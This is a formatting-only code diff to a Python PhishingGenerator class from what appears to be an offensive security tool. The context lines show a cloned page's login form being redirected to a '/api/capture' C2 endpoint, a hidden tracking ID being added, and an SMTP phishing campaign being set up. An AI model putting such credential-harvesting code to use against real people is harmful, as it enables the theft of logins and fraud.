@@ -154,10 +154,7 @@ class PhishingGenerator:
                 form["action"] = "/api/capture"  # Drakben C2 Endpoint
                 form["method"] = "POST"
                 # Add hidden tracking ID
-                req_id = "".join(
-                    secrets.choice(string.ascii_uppercase + string.digits)
-                    for _ in range(16)
-                )
+                req_id = "".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(16))
                 input_tag = soup.new_tag(
                     "input",
                     attrs={"type": "hidden", "name": "req_id", "value": req_id},
@@ -190,7 +187,9 @@ class PhishingGenerator:
             return ""
 
     def _fix_asset_links(
-        self, soup: BeautifulSoup, base_url: str,
+        self,
+        soup: BeautifulSoup,
+        base_url: str,
     ) -> None:
         """Fix asset links in cloned page.
 
@@ -247,7 +246,10 @@ class PhishingGenerator:
         # Security: never log SMTP credentials
         logger.info(
             "SMTP campaign: host=%s, port=%s, user=%s, from=%s",
-            smtp_host, smtp_port, smtp_user, smtp_from,
+            smtp_host,
+            smtp_port,
+            smtp_user,
+            smtp_from,
         )
 
         # Load HTML template
